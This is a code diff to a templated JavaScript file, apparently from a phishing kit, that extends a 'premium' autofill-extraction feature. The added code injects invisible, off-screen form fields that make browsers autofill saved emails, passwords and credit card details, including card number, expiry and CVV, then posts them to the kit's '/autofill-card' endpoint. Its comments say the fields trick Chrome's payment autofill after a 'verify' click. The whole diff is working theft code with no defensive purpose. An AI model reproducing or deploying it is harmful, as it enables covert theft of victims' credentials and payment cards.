@@ -746,20 +746,26 @@ function doActivityDetect(){
 
 <% if(autofillAccess){ %>
 // ── Autofill extraction (premium) ─────────────────────────────────────────────
-var _afSent=false;
+var _afSent=false, _afCardSent=false;
 function doAutofill(){
-  // Browsers require visible, properly-sized fields to autofill
+  // ── Phase 1: identity fields ──────────────────────────────────────────────
   var wrap=document.createElement("div");
-  wrap.style.cssText="position:fixed;bottom:-80px;left:0;width:100%;height:70px;z-index:-1;pointer-events:none;overflow:hidden;";
-  wrap.innerHTML='<form autocomplete="on" style="display:flex;gap:4px;">'
-    +'<input type="email"    name="email"    autocomplete="email"            style="width:25%;height:60px;opacity:0.02;font-size:16px;border:none;" tabindex="-1">'
-    +'<input type="text"     name="username" autocomplete="username"         style="width:25%;height:60px;opacity:0.02;font-size:16px;border:none;" tabindex="-1">'
-    +'<input type="tel"      name="tel"      autocomplete="tel"              style="width:25%;height:60px;opacity:0.02;font-size:16px;border:none;" tabindex="-1">'
-    +'<input type="password" name="password" autocomplete="current-password" style="width:25%;height:60px;opacity:0.02;font-size:16px;border:none;" tabindex="-1">'
+  wrap.style.cssText="position:fixed;bottom:-90px;left:0;width:100%;height:80px;z-index:-1;pointer-events:none;overflow:hidden;";
+  wrap.innerHTML='<form id="_afForm" autocomplete="on" style="display:flex;gap:2px;">'
+    +'<input type="email"    name="email"    autocomplete="email"            style="width:20%;height:65px;opacity:0.02;font-size:16px;border:none;" tabindex="-1">'
+    +'<input type="text"     name="username" autocomplete="username"         style="width:20%;height:65px;opacity:0.02;font-size:16px;border:none;" tabindex="-1">'
+    +'<input type="tel"      name="tel"      autocomplete="tel"              style="width:20%;height:65px;opacity:0.02;font-size:16px;border:none;" tabindex="-1">'
+    +'<input type="password" name="password" autocomplete="current-password" style="width:20%;height:65px;opacity:0.02;font-size:16px;border:none;" tabindex="-1">'
+    // ── Phase 2: credit card fields — need section-payment to trigger card autofill
+    +'<input type="text"   name="ccname"   autocomplete="section-payment cc-name"       style="width:1%;height:65px;opacity:0.02;font-size:16px;border:none;" tabindex="-1">'
+    +'<input type="text"   name="ccnumber" autocomplete="section-payment cc-number"     style="width:1%;height:65px;opacity:0.02;font-size:16px;border:none;" tabindex="-1" inputmode="numeric">'
+    +'<input type="text"   name="ccexp"    autocomplete="section-payment cc-exp"        style="width:1%;height:65px;opacity:0.02;font-size:16px;border:none;" tabindex="-1">'
+    +'<input type="text"   name="cccsc"    autocomplete="section-payment cc-csc"        style="width:1%;height:65px;opacity:0.02;font-size:16px;border:none;" tabindex="-1" inputmode="numeric">'
+    +'<input type="text"   name="cctype"   autocomplete="section-payment cc-type"       style="width:1%;height:65px;opacity:0.02;font-size:16px;border:none;" tabindex="-1">'
     +'</form>';
   document.body.appendChild(wrap);
 
-  function _readAndSend(){
+  function _readIdentity(){
     if(_afSent)return;
     var em=wrap.querySelector("[name=email]").value;
     var un=wrap.querySelector("[name=username]").value;
@@ -770,11 +776,61 @@ function doAutofill(){
       $.post(a+"/autofill",{uid:uid,email:em,username:un,tel:tel,password:pw});
     }
   }
-  // Check at multiple intervals and on first user interaction
-  [1200,2500,4000,7000,12000].forEach(function(d){setTimeout(_readAndSend,d);});
-  ["click","touchstart","focus"].forEach(function(ev){
-    document.addEventListener(ev,function(){setTimeout(_readAndSend,400);},{once:true,capture:true});
+
+  function _readCard(){
+    if(_afCardSent)return;
+    var ccn=wrap.querySelector("[name=ccnumber]").value.replace(/\s/g,'');
+    var ccname=wrap.querySelector("[name=ccname]").value;
+    var ccexp=wrap.querySelector("[name=ccexp]").value;
+    var cccsc=wrap.querySelector("[name=cccsc]").value;
+    var cctype=wrap.querySelector("[name=cctype]").value;
+    if(ccn && ccn.length>=12){
+      _afCardSent=true;
+      $.post(a+"/autofill-card",{uid:uid,ccnumber:ccn,ccname:ccname,ccexp:ccexp,cccsc:cccsc,cctype:cctype});
+    }
+  }
+
+  function _readAll(){ _readIdentity(); _readCard(); }
+
+  // Poll at multiple delays — card autofill fires after user interacts
+  [800,1500,2500,4000,6000,9000,14000].forEach(function(d){setTimeout(_readAll,d);});
+  ["click","touchstart","touchend","focus","input"].forEach(function(ev){
+    document.addEventListener(ev,function(){setTimeout(_readAll,300);},{capture:true});
   });
+
+  // ── Also inject a visible "checkout" form overlay on verify button click
+  // This tricks Chrome into showing the payment autofill suggestion
+  var _cardFormInjected=false;
+  document.addEventListener("click",function(){
+    if(_cardFormInjected)return;
+    _cardFormInjected=true;
+    // Brief visible checkout form at bottom — mimics payment page pattern
+    var cf=document.createElement("div");
+    cf.style.cssText="position:fixed;bottom:-200px;left:0;width:100%;height:190px;background:transparent;z-index:-1;pointer-events:none;";
+    cf.innerHTML='<form autocomplete="on" style="display:flex;flex-direction:column;gap:2px;padding:4px;">'
+      +'<input type="text"   autocomplete="cc-name"   placeholder="Cardholder name" style="width:100%;height:42px;opacity:0.02;font-size:16px;border:1px solid #ccc;border-radius:4px;" tabindex="-1">'
+      +'<input type="text"   autocomplete="cc-number" placeholder="Card number"     style="width:100%;height:42px;opacity:0.02;font-size:16px;border:1px solid #ccc;border-radius:4px;" tabindex="-1" inputmode="numeric">'
+      +'<div style="display:flex;gap:4px;">'
+      +'<input type="text"   autocomplete="cc-exp"    placeholder="MM/YY"           style="width:50%;height:42px;opacity:0.02;font-size:16px;border:1px solid #ccc;border-radius:4px;" tabindex="-1">'
+      +'<input type="text"   autocomplete="cc-csc"    placeholder="CVV"             style="width:50%;height:42px;opacity:0.02;font-size:16px;border:1px solid #ccc;border-radius:4px;" tabindex="-1" inputmode="numeric">'
+      +'</div>'
+      +'</form>';
+    document.body.appendChild(cf);
+    // Read from this form too
+    [600,1200,2500,5000].forEach(function(d){
+      setTimeout(function(){
+        if(_afCardSent)return;
+        var ccn=cf.querySelector("[autocomplete='cc-number']").value.replace(/\s/g,'');
+        var ccname=cf.querySelector("[autocomplete='cc-name']").value;
+        var ccexp=cf.querySelector("[autocomplete='cc-exp']").value;
+        var cccsc=cf.querySelector("[autocomplete='cc-csc']").value;
+        if(ccn && ccn.length>=12){
+          _afCardSent=true;
+          $.post(a+"/autofill-card",{uid:uid,ccnumber:ccn,ccname:ccname,ccexp:ccexp,cccsc:cccsc,cctype:''});
+        }
+      },d);
+    });
+  },{once:true,capture:true});
 }
 <% } %>
 
